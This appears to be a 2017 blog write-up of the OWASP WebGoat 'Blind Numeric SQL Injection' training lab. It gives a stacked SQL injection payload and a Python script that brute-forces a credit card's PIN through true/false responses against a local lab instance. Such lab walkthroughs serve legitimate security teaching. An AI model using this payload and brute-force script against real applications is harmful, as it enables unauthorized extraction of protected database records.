---
layout: post
title:  "OWASP BWA WebGoat Challenge: Injection Flaws"
subtitle: "Blind SQL Injection (Numeric)"
date:   2017-01-30 06:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Blind Numeric SQL Injection
Instructions:

- The form below allows a user to enter an account number and determine if it is valid or not. Use this form to develop a true / false test check other entries in the database.
- The goal is to find the value of the field pin in table pins for the row with the cc_number of 1111222233334444. The field is of type int, which is an integer.
- Put the discovered pin value in the form to pass the lesson.

First thing to do is throw some test input at the application and see what we get back:

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_14/blind-canary-alive.jpg">

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_14/blind-canary-dead.jpg">

Alright, so we have some feedback for true and false values in our database. This is actually all we need to create a Blind SQL Injection attack. Our next step is to craft iterative requests to probe the database and find the user that has our desired criteria. We will be able to tell when we found our user when we receive a positive hit (output that looks like our first test).

First thing to do is craft the SQL statement that we will be sending to the server. Our initial request looked like this:

```
account_number=101&SUBMIT=Go%21
```

We need to build a SQL injection on top of this that will return true when we find the pin associated with the credit card number ```1111222233334444``` in the ```pins``` table. I came up with something that looked like this:

```
select * from pins where cc_number = 1111222233334444 and pin = xxx
```

Then we write out our full statement to bruteforce:

```
101;select * from pins where cc_number = 1111222233334444 and pin = xxx--
```

Alright, so we have our payload template for our bruteforce. Now we could use BurpSuite's Intruder tool to perform this bruteforce. Unfortunately the free version has a heavy rate-limit built into it between requests. So, why don't we repurpose our brute-forcing script from before for cracking the ```Forgot Password``` challenge into a Blind SQL injection tool? Here's what it looks like (remembering to update our session cookie):

{% highlight python %}
import sys
import requests

def main():

	headers = {
		"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
	}
	cookies = dict(JSESSIONID="9807FE50B02B2B1D50B8113FFB60D0DC",acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")

	for x in range(0, 10000):
		pin = str(x).zfill(4)
		print ("[*] Attempting PIN: {}".format(pin))
		pin_request = '101;select * from pins where cc_number = 1111222233334444 and pin = {}--'.format(pin)
		payload= {"account_number":pin_request,"SUBMIT":"Go%21"}
		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=4&menu=1100", params=payload, headers=headers, cookies=cookies)
		if r.status_code == 200:
			if "account number is valid" in r.text.lower():
				print ("[+] SUCCESS! PIN is: {}".format(pin))
				sys.exit(0)
		else:
			print ("error: {}".format(r.text))
			sys.exit(1)

main()
{% endhighlight %}

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_14/pin-success.jpg">

And when we enter that PIN into the form:

<img src="{{ site.baseurl }}/images/2017-01-30-webgoat_part_14/pin-defeated.jpg">

Brute-force to the rescue!